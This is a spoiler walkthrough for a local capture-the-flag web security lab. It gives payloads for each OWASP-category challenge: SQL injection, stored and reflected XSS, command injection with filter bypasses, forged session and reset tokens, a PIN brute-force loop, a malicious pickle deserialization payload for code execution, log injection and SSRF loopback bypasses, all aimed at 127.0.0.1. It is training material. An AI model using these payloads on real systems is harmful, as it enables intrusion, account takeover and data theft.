# 🛑 SPOILERS: Tehut Security CTF walkthrough (Pixel Palace Arcade)

Try the in-game hints first, they're cheaper than your pride. Each section is collapsed.
Flags differ per install, so this shows *how* to get them, not the flag strings.

Every command assumes the lab runs at `http://127.0.0.1:5000`. `$C` is your session
cookie after logging in as intern:

```bash
curl -s -c jar -d 'username=intern&password=intern' http://127.0.0.1:5000/login
C="-b jar"
```

<details><summary><b>A01 · Nosy Neighbour</b> (IDOR)</summary>

Your staff profile is `/profile?id=5`. Change it to `/profile?id=2` to read Alice's private notes.
</details>

<details><summary><b>A01 · Forgotten API</b> (missing authorization on an API)</summary>

`/robots.txt` lists `/api/v1/admin/users`. The HTML page `/admin` checks your role; the
API doesn't. Open it.
</details>

<details><summary><b>A01 · Manager Clicks Everything</b> (CSRF)</summary>

Token gifts are `GET /gift?to=X&amount=Y` with no token. On the help desk (`/support`), send:

```html
<img src="/gift?to=intern&amount=5000">
```

The floor manager's browser loads the image with the admin session and gifts you tokens.
</details>

<details><summary><b>A02 · Backup Blunder</b> (weak password hashing + exposed backup)</summary>

`/robots.txt` → `/backup/` → `pixelpalace_staff_2026-03.sql.bak`. The owner's hash is unsalted
MD5. Crack it (crackstation.net, or `hashcat -m 0 hash.txt rockyou.txt`), log in as `owner`
and open `/account`.
</details>

<details><summary><b>A03 · Union Station</b> (SQL injection)</summary>

A single quote breaks the query and the error shows the SQL. Three columns:

```
' UNION SELECT 1,name,sql FROM sqlite_master--
' UNION SELECT id,label,secret FROM cheat_codes--
```
</details>

<details><summary><b>A03 · Mirror, Mirror</b> (reflected XSS)</summary>

```
/hello?name=<script>alert(1)</script>
```
</details>

<details><summary><b>A03 · Graffiti Wall</b> (stored XSS, filter bypass)</summary>

`<script>` tags are stripped; event handlers aren't. Post:

```html
<img src=x onerror=alert(1)>
```

Use **🧽 Clean the wall** afterwards if the popups get annoying.
</details>

<details><summary><b>A03 · Ping of Doom</b> (OS command injection)</summary>

`;`, `&` and `|` are blocked, but command substitution and newlines aren't:

```
/tools/ping?host=$(cat data/secrets/ping_flag.txt)
/tools/ping?host=127.0.0.1%0acat data/secrets/ping_flag.txt
```
</details>

<details><summary><b>A04 · Reset Roulette</b> (predictable reset token)</summary>

Request a reset for `intern` and check `/inbox`: the token is `md5("intern")`.
Forge one for someone else:

```bash
T=$(echo -n alice | md5sum | cut -d' ' -f1)
# open /reset/confirm?user=alice&token=$T and set a new password
```
</details>

<details><summary><b>A04 · Infinite Token Glitch</b> (business logic)</summary>

The form has `min="1"`; the server doesn't check. Send a negative amount:

```
/gift?to=admin&amount=-1000000
```
</details>

<details><summary><b>A05 · Stack Trace Spill</b> (debug mode in production)</summary>

```
/profile?id=banana
```

The crash page dumps the traceback and an environment snapshot.
</details>

<details><summary><b>A06 · Ancient Templates</b> (known-vulnerable component)</summary>

`/status` shows minitpl 0.9.1 (latest is 1.4.0). Its changelog says 0.x exposed `app`
to templates. On `/tools/card` use the template:

```
{{ app.config }}
```
</details>

<details><summary><b>A07 · Cookie Forgery</b> (predictable session IDs)</summary>

Your `sessid` is `md5("intern")`. The admin is logged in, so forge theirs:

```bash
curl -s -b "sessid=$(echo -n admin | md5sum | cut -d' ' -f1)" http://127.0.0.1:5000/account
```
</details>

<details><summary><b>A07 · PIN Cracker</b> (no brute-force protection)</summary>

```bash
for i in $(seq -w 0 9999); do
  curl -s -d "pin=$i" http://127.0.0.1:5000/locker | grep -o 'FLAG{[^}]*}' && break
done
```

Or `ffuf -w <(seq -w 0 9999) -u http://127.0.0.1:5000/locker -X POST -d 'pin=FUZZ' -mr FLAG`
</details>

<details><summary><b>A08 · Gold Membership</b> (unsigned client-side data)</summary>

The `membership` cookie is base64 JSON. Forge a gold one:

```bash
curl -s -b "membership=$(echo -n '{"user":"intern","tier":"gold"}' | base64)" http://127.0.0.1:5000/vip
```

Or edit the cookie in DevTools and reload.
</details>

<details><summary><b>A08 · Pickle Rick</b> (insecure deserialization → RCE)</summary>

The export is a base64 Python pickle (it starts with `gASV`). Build a malicious one:

```python
import base64, pickle, subprocess
class P:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "data/secrets/pickle_flag.txt"],))
print(base64.b64encode(pickle.dumps(P())).decode())
```

Paste the output into **Import** on the save file page (`/settings`).
</details>

<details><summary><b>A09 · Fake News Logs</b> (log injection)</summary>

Failed logins log the raw username. Inject a newline and a fake success line:

```bash
curl -s --data 'username=x%0a2026-01-01 00:00:00 LOGIN SUCCESS user=admin&password=x' \
  http://127.0.0.1:5000/login >/dev/null
```

Then open `/logs`.
</details>

<details><summary><b>A10 · Inside Job</b> (SSRF with a blocklist bypass)</summary>

`localhost` and `127.0.0.1` are blocked as strings. Spell loopback another way:

```
/tools/preview?url=http://127.1:5000/internal/metadata
/tools/preview?url=http://2130706433:5000/internal/metadata
/tools/preview?url=http://0.0.0.0:5000/internal/metadata
```
</details>

<details><summary><b>Bonus · Old School</b></summary>

Type the Konami code on any page: ↑ ↑ ↓ ↓ ← → ← → B A
</details>

---

Want to check every challenge at once? `python3 solutions/solve_all.py --submit`
(warning: it marks everything solved on your instance).
